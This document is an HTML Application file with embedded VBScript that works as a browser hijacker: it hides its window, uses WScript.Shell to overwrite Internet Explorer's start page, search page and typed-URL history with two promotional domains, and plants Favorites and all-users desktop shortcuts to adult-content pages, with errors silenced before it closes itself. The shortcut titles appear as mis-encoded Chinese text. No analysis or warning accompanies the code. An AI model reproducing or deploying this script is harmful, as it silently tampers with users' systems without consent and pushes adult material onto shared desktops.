   <html>
   <hta:application caption="no" showintaskbar="no">
   <body onload="window.blur();">
   <object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script LANGUAGE="VBScript">


   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.come114.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.come114.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://come114.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "about:blank"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://www.444mmm.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://www.444mmm.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://www.come114.com/"
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.come114.com/"
   window.close
   </script>
   <script language=VBScript>
   on error resume next
   Call Bugs_AddFavorites("ÐÔ°®¼¼ÇÉ","http://www.444mmm.com/sex/")
   Call Bugs_AddFavorites("¼¤Çé³ÉÈËµçÓ°","http://www.444mmm.com/film/")

   on error resume next
   Call Bugs_AddDesktop("Î´³ÉÄêÈËÎð½ø","http://www.444mmm.com/love/")
   Call Bugs_AddDesktop("ÐÔ°®¼¼ÇÉ","http://www.444mmm.com/sex/")
   Call Bugs_AddDesktop("¼¤Çé³ÉÈËµçÓ°","http://www.444mmm.com/vcd.htm")
   Function Bugs_AddFavorites(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function

   Function Bugs_AddDesktop(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function
   </script>
   <script language="javascript">
   window.close();
   </script>
   </body>
   </html>
